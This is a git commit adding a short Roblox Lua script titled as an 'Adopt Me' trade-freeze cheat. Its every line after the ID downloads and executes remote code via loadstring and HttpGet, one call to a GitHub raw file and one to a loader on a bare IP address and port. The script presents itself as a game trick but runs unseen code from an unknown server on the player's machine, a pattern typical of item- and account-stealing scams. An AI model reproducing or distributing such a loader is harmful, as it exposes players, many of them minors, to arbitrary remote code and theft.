172612d43d8bc0200dcee7920959e791bcfde439
Dev <filip10910@gmail.com>
2025-11-27 17:40:28 +0100

    Create Adopt-me-Trade-Freeze.lua

---
+++ Adopt-me-Trade-Freeze.lua
@@ -0,0 +1,3 @@
+ID="9754e1cb-de0a-4aed-924f-1da47421f258";
+RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/DevTrax9/Main/refs/heads/main/adopt-visual.lua"))();
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
